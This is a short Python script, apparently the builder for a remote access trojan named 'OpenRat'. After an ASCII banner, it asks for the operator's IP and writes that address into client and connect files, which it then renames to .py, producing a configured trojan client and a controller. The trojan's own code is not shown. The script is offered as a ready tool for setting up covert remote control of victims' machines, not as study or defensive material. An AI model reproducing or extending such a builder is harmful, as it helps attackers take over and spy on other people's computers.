#!/usr/bin/python
import os
import sys
print "*********************************************"
print "*  ____                   _____       _     *"
print "* / __ \                 |  __ \     | |    *"
print "*| |  | |_ __   ___ _ __ | |__) |__ _| |_   *"
print "*| |  | | '_ \ / _ \ '_ \|  _  // _` | __|  *"
print "*| |__| | |_) |  __/ | | | | \ \ (_| | |_   *"
print "* \____/| .__/ \___|_| |_|_|  \_\__,_|\__|  *"
print "*       | |                                 *"
print "*       |_|                                 *"
print "*                                 v.1.1     *"
print "*             Created by L0(KER#_#          *"
print "*********************************************"
print "Enter your local ip"
drpri = raw_input("openrat>")
with open ('client.txt', 'r') as f:
  old_data = f.read()

new_data = old_data.replace('127.0.0.1', drpri)

with open ('client.txt', 'w') as f:
  f.write(new_data)
os.rename('client.txt', 'client.py') 

with open ('connect.txt', 'r') as f:
  old_data = f.read()

new_data = old_data.replace('127.0.0.1', drpri)

with open ('connect.txt', 'w') as f:
  f.write(new_data)
  
os.rename('connect.txt', 'connect.py')
print ('**********************************')
print ('Creation was successful')
print ('For connect open script connect.py')
print ('**********************************')
print ('Create new?')
print ('1) No, exit')
print ('2) Yes')
a = int(input('openrat>'))
if a > 1:
    print('Please, run the reload.py script!')
elif a < 2:
    print('Bye!')
